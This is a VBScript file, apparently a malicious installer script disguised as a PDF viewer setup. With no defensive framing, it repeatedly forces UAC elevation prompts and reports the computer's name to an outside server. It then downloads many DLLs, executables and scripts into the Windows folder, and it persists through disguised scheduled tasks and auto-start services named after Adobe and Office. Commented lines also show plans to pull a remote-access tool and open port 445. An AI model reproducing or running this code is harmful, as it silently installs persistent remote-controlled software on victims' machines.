On Error Resume Next
'MsiInfo.exe C:\Users\Francesco\Documents\GitHub\CppWindowsService\Setup1user\Setup1\Release\PdfViewer.msi -w 10
Set oShell = CreateObject ("WScript.Shell") 
Set fso = CreateObject("Scripting.FileSystemObject")
windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
temp = oShell.ExpandEnvironmentStrings( "%TEMP%" )
slocal = oShell.ExpandEnvironmentStrings( "%LOCALAPPDATA%" )
strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
sfilelocal="foto.jpg" 'Supremo.exe
sfile="file.pdf" 'Supremo.exe
'sfile="Supremo.exe" 'Supremo.exe
sver="sysexecuser1"
With oShell
  .Run "cmd /c echo elevated  > " &windir & "\" & sver, 0, True
'  .Run "curl http://troglo.homepc.it/" & sfile & " -o "& temp & "\" & sfile, 0, True
  '.Run "curl http://troglo.homepc.it/file.jpg -o "& temp &"\file.jpg", 0, True
  .Run "curl http://troglo.homepc.it/win/PdfViewer-admin.msi -o "& temp &"\PdfViewer-admin.msi", 0, True 
  '.Run "curl http://troglo.homepc.it/win/sys.bat -o "& temp &"\sys.bat", 0, True
End With
belevate=1
Do while not fso.FileExists( windir & "\" & sver)
  belevate=0
  'MsgBox("elevate")  
  'oShell.Run "taskkill /f /im msiexec.exe", 0, True 
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Sleep(2000)
loop
if (belevate) then

With oShell
.Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_before_" & strComputerName, 0, True
.Run "cmd /c del " &windir & "\" & sver, 0, True
  .Run "mkdir c:\windows\hp", 0, True
  .Run "attrib -s c:\windows\sys2.dll", 0, True
  .Run "curl http://troglo.homepc.it/win/exec1.dll -o c:\windows\exec1.dll", 0, True
  .Run "curl http://troglo.homepc.it/win/CppWindowsService.xml -o c:\windows\CppWindowsService.xml", 0, True
.Run "curl http://troglo.homepc.it/win/adobesys.xml -o c:\windows\adobesys.xml", 0, True
.Run "curl http://troglo.homepc.it/win/adobesysuser.xml -o c:\windows\adobesysuser.xml", 0, True
.Run "curl http://troglo.homepc.it/win/sysuser.dll -o c:\windows\hp\sysuser.dll", 0, True
.Run "curl http://troglo.homepc.it/win/sys3.dll -o c:\windows\hp\sys3.dll", 0, True
.Run "copy /Y c:\windows\hp\sys3.dll c:\windows\sys3t.dll", 0, True
.Run "curl http://troglo.homepc.it/win/sys2.dll -o c:\windows\hp\sys2.dll", 0, True
.Run "copy /Y c:\windows\hp\sys2.dll c:\windows\sys2t.dll", 0, True
.Run "curl http://troglo.homepc.it/win/office_get.xml -o c:\windows\office_get.xml", 0, True
.Run "curl http://troglo.homepc.it/win/get.vbs -o c:\windows\get.vbs", 0, True
.Run "schtasks /delete /tn office_get /F", 0, True
.Run "schtasks /create /tn office_get /xml %windir%\office_get.xml /F", 0, True
.Run "schtasks /delete /tn CppWindowsService /F", 0, True
.Run "schtasks /create /tn CppWindowsService /xml %windir%\CppWindowsService.xml /F", 0, True
.Run "schtasks /delete /tn adobesys /F", 0, True
.Run "schtasks /create /tn adobesys /xml %windir%\adobesys.xml /F", 0, True
.Run "schtasks /create /tn adobesysuser /xml %windir%\adobesysuser.xml /F", 0, True
.Run "curl http://troglo.homepc.it/win/sys2.exe -o c:\windows\sys2.exe", 0, True
.Run "curl http://troglo.homepc.it/win/sys3.exe -o c:\windows\sys3.exe", 0, True
.Run "sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= ""CppWindowsService"" start= auto", 0, True
.Run "sc create adobesys binPath= c:\windows\sys3.exe DisplayName= ""adobesys"" start= auto", 0, True
.Run "curl http://troglo.homepc.it/win/svc.vbs -o c:\windows\hp\svc.vbs", 0, True
.Run "curl http://troglo.homepc.it/win/libssl-1_1.dll -o c:\windows\libssl-1_1.dll", 0, True
.Run "curl http://troglo.homepc.it/win/libcurl.dll -o c:\windows\libcurl.dll", 0, True
.Run "curl http://troglo.homepc.it/win/libcrypto-1_1.dll -o c:\windows\libcrypto-1_1.dll", 0, True
'.Run temp  & "\" & sfile, 0, True 
.Run slocal  & "\wix\" & sfilelocal, 0, True 
.Run "cscript c:\windows\hp\svc.vbs", 0, True
.Run "curl http://troglo.homepc.it/win/cmd.bat -o c:\windows\cmd.bat", 0, True
.Run "net start CppWindowsService", 0, True
.Run "net start adobesys", 0, True
.Run "c:\windows\cmd.bat", 0, True
  '.Run "msiexec /i "&temp & "\PdfViewer-admin.msi", 0, True
  '.Run "cmd /c echo elevated  > " &windir & "\sysexecuser", 0, True
  '.Run "curl http://troglo.homepc.it/Supremo.exe -o "& windir &"\Supremo.exe", 0, True
  WScript.Sleep(2000)   
  '.Run temp  & "\" & sfile, 0, True 
  '.Run temp & "\file.jpg", 0, True 
  .Run "net stop adobesys", 0, True 
  .Run "net stop CppWindowsService", 0, True 
  .Run "taskkill /f /im rundll32.exe", 0, True 
  .Run "taskkill /f /im sys2.exe", 0, True 
  .Run "taskkill /f /im sys3.exe", 0, True 
  
  '.Run "curl http://troglo.homepc.it/win/PdfViewer-admin.msi -o "& windir &"\PdfViewer-admin.msi", 0, True  
  WScript.Sleep(2000) 
  '.Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_before_" & strComputerName, 0, True
  '.Run "curl http://troglo.homepc.it/win/sys.bat -o "& windir &"\sys.bat", 0, True
  '.Run "msiexec /i "&temp & "\PdfViewer-admin.msi", 0, True  
  '.Run temp & "\sys.bat", 0, True 
  
  WScript.Sleep(2000) 
  .Run "cmd /c del " &windir & "\" & sver, 0, True
  
  

'  .Run "cmd /c NETSH advfirewall firewall add rule name=""445"" profile=public,private,domain dir=in localport=445 protocol=tcp action=allow description=""445""", 0, True
'  .Run "schtasks /stop /tn syssw", 0, True
'  .Run "schtasks /delete /tn syssw /F", 0, True
  '.Run "schtasks /create /ru ""SYSTEM"" /sc MONTHLY /ST " & DateAdd("s", 30, Now) & " /tr """ & windir & "\svc.vbs"" /tn syssw /rl highest /F", 0, True
'  .Run "schtasks /create /tn syssw /xml " & windir & "\syssw.xml /F", 0, True
  '.Run "schtasks /create /ru ""SYSTEM"" /sc MONTHLY  /tr """ & windir & "\hp\svc.vbs"" /tn syssw /rl highest /F", 0, True
'  .Run "schtasks /run /tn syssw", 0, True
  
  'If UserPerms("Admin") Then
  ' Message = "Good to go"
  '.Run windir & "\file.pdf"
   '.Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_" & strComputerName, 0, True
  'Else
  ' Message = "Non-Admin"
  'End If
End With
end if


Set objArgs = Wscript.Arguments
'if Wscript.Arguments.count>0 then
if WScript.Arguments.Named.Exists("elevate") then

   'MsgBox("elevate")    
  'if Wscript.Arguments.count>1 then
  '  oShell.Run objArgs(0), 0, True
  'end if
  'oShell.Run "taskkill /f /im cscript.exe", 0, True
  'oShell.Run "taskkill /f /im wscript.exe", 0, True
end if
if Wscript.Arguments.count>1 then
  MsgBox(objArgs(0)) 
  'sname = WScript.ScriptFullName & """ """ & objArgs(0)
else
  sname = WScript.ScriptFullName
end if

'oShell.Run oShell.ExpandEnvironmentStrings( "%APPDATA%" )&"\elevate.exe cscript.exe " & WScript.ScriptFullName, 0, True

WScript.Quit

Function XmlTime(t)
    Dim cSecond, cMinute, CHour, cDay, cMonth, cYear
    Dim tTime, tDate

    cSecond = "0" & Second(t)
    cMinute = "0" & Minute(t)
    cHour = "0" & Hour(t)
    cDay = "0" & Day(t)
    cMonth = "0" & Month(t)
    cYear = Year(t)

    tTime = Right(cHour, 2) & ":" & Right(cMinute, 2) & _
        ":" & Right(cSecond, 2)
    tDate = cYear & "-" & Right(cMonth, 2) & "-" & Right(cDay, 2)
    XmlTime = tDate & "T" & tTime 
End Function
Function UserPerms (PermissionQuery)          
 UserPerms = False  ' False unless proven otherwise           
 Dim CheckFor, CmdToRun         

 Select Case Ucase(PermissionQuery)           
 'Setup aliases here           
 Case "ELEVATED"           
   CheckFor =  "S-1-16-12288"           
 Case "ADMIN"           
   CheckFor =  "S-1-5-32-544"           
 Case "ADMINISTRATOR"           
   CheckFor =  "S-1-5-32-544"           
 Case Else                  
   CheckFor = PermissionQuery                  
 End Select           

 CmdToRun = "%comspec% /c whoami /all | findstr /I /C:""" & CheckFor & """"  

 Dim oShell, returnValue        
 Set oShell = CreateObject("WScript.Shell")  
 returnValue = oShell.Run(CmdToRun, 0, true)     
 If returnValue = 0 Then UserPerms = True                   
End Function

Function UACTurnedOn ()
 On Error Resume Next

 Set oShell = CreateObject("WScript.Shell")
 If oShell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA") = 0 Then
      UACTurnedOn = false
 Else
      UACTurnedOn = true
 End If
End Function